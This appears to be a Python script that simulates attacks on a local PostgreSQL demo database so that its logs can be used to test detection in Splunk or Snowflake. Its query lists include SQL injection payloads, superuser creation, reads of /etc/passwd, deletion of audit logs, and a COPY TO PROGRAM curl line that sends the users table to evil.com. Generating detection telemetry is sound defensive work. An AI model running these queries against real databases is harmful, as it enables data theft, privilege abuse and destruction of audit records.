#!/usr/bin/env python3
"""
PostgreSQL Suspicious Query Generator

Generates SQL queries that simulate attacker behavior patterns:
- SQL injection attempts
- Privilege escalation
- Data exfiltration
- Reconnaissance
- Credential theft attempts

These queries will be logged by PostgreSQL and can be detected by Splunk/Snowflake.
"""

import psycopg2
import time
import random
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

# Database connection settings
DB_CONFIG = {
    "dbname": "demo_app",
    "user": "kevin",  # Will use current user
    "host": "localhost",
    "port": 5432
}

# Suspicious queries organized by attack type
ATTACK_PATTERNS = {
    "sql_injection_attempts": [
        # Classic SQL injection patterns (these will fail but get logged)
        "SELECT * FROM users WHERE username = '' OR '1'='1'",
        "SELECT * FROM users WHERE username = 'admin'--'",
        "SELECT * FROM users WHERE id = 1; DROP TABLE users;--",
        "SELECT * FROM users WHERE username = '' UNION SELECT NULL, table_name, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables--",
        "SELECT * FROM products WHERE name = '' OR 1=1 UNION SELECT credit_card_number, expiry FROM payments--",
        "SELECT * FROM users WHERE username = 'admin' AND password = '' OR ''=''",
    ],
    
    "privilege_escalation": [
        # Attempts to modify privileges
        "UPDATE users SET role = 'admin' WHERE username = 'john_doe'",
        "INSERT INTO users (username, email, role) VALUES ('hacker', 'h@evil.com', 'admin')",
        "ALTER TABLE users ADD COLUMN backdoor TEXT",
        "CREATE USER malicious_admin WITH SUPERUSER PASSWORD 'hack123'",
        "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO public",
    ],
    
    "data_exfiltration": [
        # Attempts to extract sensitive data
        "SELECT username, password_hash, email FROM users",
        "SELECT * FROM credit_cards",
        "COPY users TO '/tmp/users_dump.csv' WITH CSV HEADER",
        "SELECT id, card_number_encrypted, last_four FROM credit_cards",
        "SELECT * FROM users UNION SELECT * FROM sessions",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT string_agg(username || ':' || password_hash, E'\\n') FROM users",
    ],
    
    "reconnaissance": [
        # Information gathering
        "SELECT version()",
        "SELECT current_user, current_database()",
        "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'",
        "SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users'",
        "SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'credit_cards'",
        "SELECT * FROM pg_stat_activity",
        "SELECT * FROM pg_roles",
        "SELECT datname FROM pg_database",
        "SHOW server_version",
        "SELECT inet_server_addr(), inet_server_port()",
    ],
    
    "brute_force_login": [
        # Multiple failed login pattern simulation
        "SELECT * FROM users WHERE username = 'admin' AND password_hash = 'wrong1'",
        "SELECT * FROM users WHERE username = 'admin' AND password_hash = 'wrong2'",
        "SELECT * FROM users WHERE username = 'admin' AND password_hash = 'wrong3'",
        "SELECT * FROM users WHERE username = 'root' AND password_hash = 'password'",
        "SELECT * FROM users WHERE username = 'administrator' AND password_hash = 'admin123'",
        "SELECT * FROM users WHERE email = 'admin@example.com'",
    ],
    
    "timing_attacks": [
        # Timing-based SQL injection attempts
        "SELECT * FROM users WHERE username = 'admin' AND pg_sleep(5)::text = ''",
        "SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE role='admin') > 0 THEN pg_sleep(2) ELSE pg_sleep(0) END",
        "SELECT * FROM users WHERE username = 'admin' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE pg_sleep(0) END) IS NOT NULL",
    ],
    
    "suspicious_operations": [
        # Unusual database operations
        "DROP TABLE IF EXISTS audit_log",
        "TRUNCATE TABLE sessions",
        "DELETE FROM audit_log WHERE created_at < NOW() - INTERVAL '1 day'",
        "UPDATE users SET is_active = false WHERE role != 'admin'",
        "ALTER TABLE users DISABLE TRIGGER ALL",
        "CREATE EXTENSION IF NOT EXISTS dblink",
    ],
    
    "lateral_movement": [
        # Attempts to access other resources
        "SELECT dblink_connect('host=192.168.1.100 dbname=production user=admin password=secret')",
        "COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil.com/exfil'",
        "SELECT lo_import('/etc/passwd')",
    ],
}

# Normal queries for comparison (to mix with attacks)
NORMAL_QUERIES = [
    "SELECT id, name, price FROM products WHERE category = 'electronics'",
    "SELECT COUNT(*) FROM orders WHERE status = 'completed'",
    "SELECT username, last_login FROM users WHERE is_active = true ORDER BY last_login DESC LIMIT 10",
    "INSERT INTO audit_log (user_id, action, table_name) VALUES (1, 'view', 'products')",
    "UPDATE products SET stock = stock - 1 WHERE id = 1",
    "SELECT p.name, o.total_amount FROM products p JOIN orders o ON true WHERE o.status = 'pending'",
]


def execute_query_safely(cursor, query: str, description: str) -> bool:
    """Execute a query and handle errors gracefully."""
    try:
        cursor.execute(query)
        return True
    except psycopg2.Error as e:
        # This is expected for many attack queries - they should fail!
        # The important thing is they get LOGGED
        return False


def run_attack_simulation(conn, attack_type: str, queries: list):
    """Run a set of attack queries."""
    cursor = conn.cursor()
    
    console.print(f"\n[bold red]🎯 Attack Type: {attack_type.replace('_', ' ').title()}[/bold red]")
    
    for query in queries:
        # Random delay to simulate realistic timing
        time.sleep(random.uniform(0.5, 2.0))
        
        short_query = query[:80] + "..." if len(query) > 80 else query
        success = execute_query_safely(cursor, query, attack_type)
        
        if success:
            console.print(f"  [green]✓[/green] {short_query}")
            conn.commit()
        else:
            console.print(f"  [red]✗[/red] {short_query} [dim](blocked/failed)[/dim]")
            conn.rollback()


def run_mixed_traffic(conn, num_normal: int = 5):
    """Run some normal queries to provide context."""
    cursor = conn.cursor()
    
    console.print(f"\n[bold green]📊 Normal Traffic ({num_normal} queries)[/bold green]")
    
    for _ in range(num_normal):
        query = random.choice(NORMAL_QUERIES)
        time.sleep(random.uniform(0.2, 0.5))
        
        try:
            cursor.execute(query)
            conn.commit()
            short_query = query[:60] + "..." if len(query) > 60 else query
            console.print(f"  [green]✓[/green] {short_query}")
        except:
            conn.rollback()


def main():
    console.print("[bold cyan]" + "="*60 + "[/bold cyan]")
    console.print("[bold cyan]🔓 PostgreSQL Suspicious Activity Simulator[/bold cyan]")
    console.print("[bold cyan]" + "="*60 + "[/bold cyan]")
    console.print()
    console.print("[yellow]⚠️  These queries simulate attacker behavior for demo purposes[/yellow]")
    console.print("[yellow]   All queries are logged to PostgreSQL CSV logs[/yellow]")
    console.print()
    
    try:
        conn = psycopg2.connect(**DB_CONFIG)
        console.print("[green]✓ Connected to PostgreSQL[/green]")
    except psycopg2.Error as e:
        console.print(f"[red]✗ Connection failed: {e}[/red]")
        console.print("[yellow]  Make sure PostgreSQL is running: pixi run pg-start[/yellow]")
        return
    
    try:
        # Run attack simulations with mixed normal traffic
        attack_types = list(ATTACK_PATTERNS.keys())
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task("Running attack simulation...", total=len(attack_types))
            
            for attack_type in attack_types:
                # Run some normal traffic first
                run_mixed_traffic(conn, random.randint(2, 5))
                
                # Then run the attack
                run_attack_simulation(conn, attack_type, ATTACK_PATTERNS[attack_type])
                
                progress.advance(task)
        
        # Final burst of normal traffic
        run_mixed_traffic(conn, 10)
        
        console.print()
        console.print("[bold green]✅ Simulation complete![/bold green]")
        console.print()
        console.print("[cyan]📝 Check logs at: logs/postgresql-*.csv[/cyan]")
        console.print("[cyan]🔍 Use Vector to ingest these logs to Snowflake[/cyan]")
        
    finally:
        conn.close()


if __name__ == "__main__":
    main()

